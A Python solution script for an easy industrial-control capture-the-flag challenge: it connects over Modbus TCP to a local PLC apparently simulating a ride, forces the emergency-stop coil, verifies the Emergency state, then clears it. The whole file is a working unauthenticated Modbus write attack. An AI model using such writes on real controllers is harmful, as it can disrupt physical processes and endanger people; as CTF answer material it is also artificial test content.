#!/usr/bin/env python3
"""
CTF Challenge 2: Emergency Override (Easy - 150 points)
Trigger the emergency stop through Modbus while the ride is running

Method: Write TRUE to emergency_stop_button (coil 3)
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def main():
    print("="*60)
    print("CTF Challenge 2: Emergency Override")
    print("="*60)
    print()
    print("Objective: Trigger emergency stop via Modbus")
    print("Method: Write TRUE to emergency_stop_button coil")
    print()

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    try:
        if not client.connect():
            print(f"❌ Failed to connect to PLC at {PLC_HOST}:{PLC_PORT}")
            return

        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")

        print("\n[Phase 1] Reading current PLC state...")
        result = client.read_holding_registers(1024 + 15, 1, unit=1)

        if not result.isError():
            state = result.registers[0]
            state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
            print(f"  Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

        print("\n[Phase 2] Triggering Emergency Stop...")
        print("  Writing TRUE to coil 3 (emergency_stop_button)")

        # Write TRUE to emergency_stop_button (coil 3)
        result = client.write_coil(3, True, unit=1)

        if not result.isError():
            print("  ✓ Emergency stop signal sent")

        time.sleep(1)

        print("\n[Phase 3] Verifying state change...")
        result = client.read_holding_registers(1024 + 15, 1, unit=1)

        if not result.isError():
            new_state = result.registers[0]
            state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
            print(f"  New State: {new_state} ({state_names[new_state] if new_state < len(state_names) else 'Unknown'})")

            if new_state == 4:
                print("\n🎯 SUCCESS! PLC in Emergency state")
                print("   Challenge completed!")
            else:
                print("\n⚠️  State did not change to Emergency")
                print("   Make sure the ride is running before executing")

        print("\n[Phase 4] Resetting emergency stop...")
        client.write_coil(3, False, unit=1)
        print("  ✓ Emergency stop cleared")

    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        client.close()

if __name__ == '__main__':
    main()
